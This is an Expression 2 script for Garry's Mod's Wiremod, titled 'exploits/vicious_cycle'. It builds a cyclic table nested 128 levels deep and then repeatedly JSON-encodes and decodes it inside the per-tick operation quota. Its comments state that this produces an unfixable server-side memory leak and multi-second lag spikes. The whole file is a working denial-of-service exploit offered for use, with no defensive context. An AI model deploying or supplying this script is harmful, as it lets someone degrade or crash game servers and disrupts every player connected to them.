@name exploits/vicious_cycle
@persist [Root,Branch]:table Depth Quota Main:function
@persist MAX_DEPTH

# by Fasteroid

# combines the best aspects of "memory_bucket.txt" and "json_lag.txt"

# jsonDecode / jsonEncode : causes extreme serverside memory leak, can't be fixed with collectgarbage()
# vonDecode  / vonEncode  : triggers massive lag spike on the order of several seconds regardless of MAX_DEPTH

if( first() ){
    
    Quota     = softQuota()
    
    MAX_DEPTH = 128
    D         = 0
    Root      = table()
    Branch    = Root
    
    print("loading")
    
    Main = function(){
        if( D < MAX_DEPTH ){
            local New = table()
            Branch[1,table] = New
            Branch = New
            D++
        }
        else {
            Branch[1,table] = Root
            print("executing")
            Main = function(){
                jsonDecode(jsonEncode(Root))
            }
        }
    }
    
    
}

event tick(){
    while( opcounter() < Quota ){
        Main()
    }
}


